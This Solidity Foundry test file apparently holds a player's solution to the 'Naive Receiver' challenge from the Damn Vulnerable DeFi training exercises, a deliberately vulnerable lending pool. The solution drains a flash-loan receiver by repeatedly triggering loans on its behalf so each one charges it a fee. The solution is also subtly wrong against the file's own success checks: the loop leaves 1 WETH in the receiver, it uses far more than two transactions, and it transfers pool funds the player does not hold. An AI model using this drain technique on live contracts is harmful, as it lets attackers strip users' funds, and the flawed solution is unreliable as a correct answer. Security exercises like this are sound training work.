// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool} from "../security-exercises/damn-vulnerable-defi/contracts/NaiveReceiverPool.sol";
import {Multicall} from "../security-exercises/damn-vulnerable-defi/contracts/Multicall.sol";
import {FlashLoanReceiver} from "../security-exercises/damn-vulnerable-defi/contracts/FlashLoanReceiver.sol";
import {BasicForwarder} from "../security-exercises/damn-vulnerable-defi/contracts/BasicForwarder.sol";
import {WETH} from "solmate/tokens/WETH.sol";

// added for solution
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function testAssertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * GOAL => drain the borrower, not necessarily steal their funds
     * HOW  => repeatedly trigger flash loans that incur a fee on the borrower each time, until his balance is depleted
               The receiver has 10eth, with a 1eth fee on the flash loans, would take just 10 calls
     */
   
    function testNaiveReceiver() public checkSolvedByPlayer {

        uint256 flashLoanAmount = 1 ether; 
        uint256 fee = pool.flashFee(address(weth), flashLoanAmount);
        uint256 receiverBalance = weth.balanceOf(address(receiver));

        console.log("Flash loan amount:", flashLoanAmount);
        console.log("Flash loan fee:", fee);
        console.log("Initial receiver balance:", weth.balanceOf(address(receiver)));

        // @question doesn't seem very secure that we can externally call flashloans for other contracts/wallets, isn't this prevented usually?
        do {
            pool.flashLoan(IERC3156FlashBorrower(address(receiver)), address(weth), flashLoanAmount, "");
            receiverBalance = weth.balanceOf(address(receiver));
            console.log("Updated receiver balance:", receiverBalance);
        } while (receiverBalance > fee);

        console.log("Final receiver balance:", weth.balanceOf(address(receiver)));

        uint256 poolBalance = weth.balanceOf(address(pool));

        if (poolBalance > 0) {
            weth.transfer(recovery, poolBalance);
        }
   
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure /**override*/ returns (bytes4) {
        return this.onERC721Received.selector;
    }
}